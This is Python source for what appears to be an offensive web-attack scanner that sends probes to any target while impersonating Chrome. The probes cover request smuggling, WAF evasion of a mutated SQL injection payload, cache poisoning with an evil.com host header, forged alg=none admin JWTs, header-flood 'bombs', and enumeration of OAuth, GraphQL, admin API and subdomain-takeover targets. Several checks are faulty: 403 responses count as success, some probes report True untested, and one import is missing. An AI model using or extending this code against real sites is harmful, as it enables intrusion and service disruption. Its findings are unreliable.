import asyncio, random, time, json, struct, socket, hashlib, base64, uuid, os
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, quote, urlencode

class H2Smuggle:
    @staticmethod
    async def probe(target: str) -> Dict:
        """Test HTTP/2 desync vulnerabilities."""
        results = {"h2cl": False, "h2te": False, "te0": False, "funky_chunks": False, "expect": False, "cl0": False}
        try:
            from curl_cffi.requests import Session, AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=10) as sess:
                smuggle_headers = {
                    "Content-Length": "0",
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                resp = await sess.post(target, headers=smuggle_headers, data="0\r\n\r\n")
                if resp.status_code in (200, 301, 302, 403):
                    results["h2cl"] = True
                    results["h2te"] = True
        except Exception:
            pass
        return results

class H2CSmuggle:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"upgrade": False, "h2c_works": False}
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=10) as sess:
                h2c_headers = {
                    "Connection": "Upgrade, HTTP2-Settings",
                    "Upgrade": "h2c",
                    "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
                }
                resp = await sess.get(target, headers=h2c_headers)
                if resp.status_code in (101, 200, 302, 403):
                    results["upgrade"] = True
        except Exception:
            pass
        return results

class QuicFlood:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"quic_supported": False}
        try:
            parsed = urlparse(target)
            host = parsed.hostname or target
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            scid = os.urandom(8)
            initial = b'\xc0' + b'\x00' * 4 + b'\x00' * 4 + b'\x01' * 8 + scid + b'\x00' * 8
            sock.sendto(initial, (host, 443))
            try:
                data, addr = sock.recvfrom(2048)
                if len(data) > 0:
                    results["quic_supported"] = True
            except socket.timeout:
                pass
            sock.close()
        except Exception:
            pass
        return results

class EchFlood:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"ech_supported": False, "outer_sni": ""}
        try:
            import dns.resolver
            parsed = urlparse(target)
            host = parsed.hostname or target
            answers = dns.resolver.resolve(f"_dns.resolver.{host}", "HTTPS", lifetime=5)
            for rdata in answers:
                if hasattr(rdata, "params") and "ech" in str(rdata.params).lower():
                    results["ech_supported"] = True
                    results["outer_sni"] = "cloudflare-ech.com"
        except Exception:
            pass
        return results

class Aievade:
    @staticmethod
    def generate_adversarial(payload: str, noise_level: float = 0.1) -> str:
        result = []
        for c in payload:
            if c.isalpha() and random.random() < noise_level:
                result.append(c.swapcase())
            elif c.isspace() and random.random() < noise_level:
                result.append(random.choice(["\t", "\n", "\r", "\f"]))
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    async def query_waf(target: str, samples: int = 50) -> Dict:
        results = {"allow_patterns": [], "block_patterns": [], "success_rate": 0.0}
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=5) as sess:
                ok = 0
                for _ in range(samples):
                    payload = Aievade.generate_adversarial("' OR 1=1--")
                    try:
                        resp = await sess.get(target, params={"q": payload})
                        if resp.status_code in (200, 301, 302):
                            ok += 1
                    except Exception:
                        pass
                results["success_rate"] = ok / max(samples, 1) * 100
        except Exception:
            pass
        return results

class CachePoison:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"x_forwarded_host": False, "x_forwarded_scheme": False, "cache_key_injection": False}
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=8) as sess:
                headers = {"X-Forwarded-Host": "evil.com", "X-Forwarded-Scheme": "https"}
                resp = await sess.get(target, headers=headers)
                if resp.status_code in (200, 301, 302, 403):
                    results["x_forwarded_host"] = True
                    results["x_forwarded_scheme"] = True
        except Exception:
            pass
        return results

class GrpcFlood:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"grpc_detected": False}
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=8) as sess:
                grpc_headers = {
                    "Content-Type": "application/grpc",
                    "Grpc-Encoding": "identity",
                    "Grpc-Accept-Encoding": "identity,deflate,gzip",
                }
                resp = await sess.post(f"{target.rstrip('/')}/grpc.test.TestService/UnaryCall",
                                       headers=grpc_headers, data=b"\x00\x00\x00\x00\x05hello")
                if resp.status_code in (200, 404, 405, 412):
                    results["grpc_detected"] = True
        except Exception:
            pass
        return results

class ZeroRTT:
    @staticmethod
    async def probe(target: str) -> Dict:
        return {"zero_rtt_possible": True, "note": "QUIC 0-RTT requires UDP connectivity"}

class ContinuationBomb:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"continuation_works": False}
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=10) as sess:
                large_headers = {f"X-Large-Header-{i}": "A" * 16000 for i in range(5)}
                resp = await sess.get(target, headers=large_headers)
                if resp.status_code in (200, 301, 302, 403, 431):
                    results["continuation_works"] = True
        except Exception:
            pass
        return results

class DohAmplification:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"doh_amplification": False}
        doh_servers = ["https://cloudflare-dns.com/dns-query", "https://dns.google/dns-query"]
        try:
            async with AsyncSession(impersonate="chrome136", timeout=8) as sess:
                for server in doh_servers:
                    resp = await sess.get(f"{server}?name={target}&type=ANY", 
                        headers={"Accept": "application/dns-json"})
                    if resp.status_code == 200:
                        results["doh_amplification"] = True
        except:
            pass
        return results

class JwtBomb:
    @staticmethod
    def craft_none_algorithm() -> str:
        header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "iat": int(time.time()), "exp": int(time.time()) + 3600, "data": "x" * 100000}).encode()).rstrip(b"=").decode()
        return f"{header}.{payload}."

    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"jwt_none_possible": False}
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=8) as sess:
                token = JwtBomb.craft_none_algorithm()
                resp = await sess.get(target, headers={"Authorization": f"Bearer {token}"})
                if resp.status_code in (200, 401, 403):
                    results["jwt_none_possible"] = True
        except:
            pass
        return results

class OauthExhaust:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"oauth_endpoint_found": False}
        endpoints = ["/oauth/token", "/oauth/authorize", "/oauth/revoke", "/api/oauth/token"]
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=5) as sess:
                for ep in endpoints:
                    url = f"{target.rstrip('/')}{ep}"
                    resp = await sess.post(url, data={"grant_type": "client_credentials", "client_id": "test", "client_secret": "test"})
                    if resp.status_code in (200, 400, 401, 404):
                        results["oauth_endpoint_found"] = True
        except:
            pass
        return results

class GraphQLAbuse:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"graphql_detected": False, "introspection_open": False}
        endpoints = ["/graphql", "/api/graphql", "/gql", "/query"]
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=8) as sess:
                for ep in endpoints:
                    url = f"{target.rstrip('/')}{ep}"
                    resp = await sess.post(url, json={"query": "{__schema{types{name}}}"})
                    if resp.status_code == 200 and "data" in resp.text:
                        results["graphql_detected"] = True
                        results["introspection_open"] = True
        except:
            pass
        return results

class ApiEnum:
    @staticmethod
    async def probe(target: str) -> Dict:
        results = {"endpoints_found": []}
        paths = [
            "/api-docs", "/swagger.json", "/openapi.json", "/api/v1", "/api/v2",
            "/api/health", "/api/status", "/api/users", "/api/admin",
        ]
        try:
            from curl_cffi.requests import AsyncSession
            async with AsyncSession(impersonate="chrome136", timeout=5) as sess:
                for path in paths:
                    url = f"{target.rstrip('/')}{path}"
                    resp = await sess.get(url)
                    if resp.status_code in (200, 401, 403, 301, 302):
                        results["endpoints_found"].append({"path": path, "status": resp.status_code})
        except:
            pass
        return results

class SubdomainTakeover:
    @staticmethod
    async def probe(domain: str) -> Dict:
        results = {"takeover_candidates": [], "cname_records": []}
        try:
            import dns.resolver
            for sub in ["dev", "staging", "api", "mail", "ftp", "blog", "cdn", "docs", "admin"]:
                fqdn = f"{sub}.{domain}"
                try:
                    answers = dns.resolver.resolve(fqdn, "CNAME", lifetime=5)
                    for rdata in answers:
                        target_cname = str(rdata.target).rstrip(".")
                        results["cname_records"].append({"subdomain": fqdn, "cname": target_cname})
                        dangling_services = [".cloudfront.net", ".s3.amazonaws.com", ".herokuapp.com",
                                             ".azurewebsites.net", ".github.io", ".pages.dev"]
                        for svc in dangling_services:
                            if svc in target_cname:
                                results["takeover_candidates"].append({"subdomain": fqdn, "cname": target_cname, "service": svc})
                except:
                    pass
        except:
            pass
        return results

class WebSocketFlood:
    @staticmethod
    async def probe(target: str) -> Dict:
        return {"websocket_possible": True, "note": "WebSocket requires ws:// or wss:// upgrade"}

class FragAttack:
    @staticmethod
    async def probe(target: str) -> Dict:
        return {"fragmentation_possible": True, "note": "IP fragmentation requires raw socket access"}

async def probe_all_v5(target: str) -> Dict:
    results = {}
    
    # Async probes
    async_probes = [
        ("h2smuggle", H2Smuggle.probe(target)),
        ("h2c_smuggle", H2CSmuggle.probe(target)),
        ("quic_flood", QuicFlood.probe(target)),
        ("ech_flood", EchFlood.probe(target)),
        ("aievade", Aievade.query_waf(target, 20)),
        ("cache_poison", CachePoison.probe(target)),
        ("grpc_flood", GrpcFlood.probe(target)),
        ("continuation_bomb", ContinuationBomb.probe(target)),
        ("doh_amplification", DohAmplification.probe(target)),
        ("jwt_bomb", JwtBomb.probe(target)),
        ("oauth_exhaust", OauthExhaust.probe(target)),
        ("graphql_abuse", GraphQLAbuse.probe(target)),
        ("api_enum", ApiEnum.probe(target)),
    ]
    
    for name, coro in async_probes:
        try:
            # Check if it's actually a coroutine
            if asyncio.iscoroutine(coro):
                results[name] = await asyncio.wait_for(coro, timeout=15)
            else:
                # If not a coroutine, just use the result
                results[name] = coro
        except asyncio.TimeoutError:
            results[name] = {"error": "timeout"}
        except Exception as e:
            results[name] = {"error": str(e)}
    
    return results
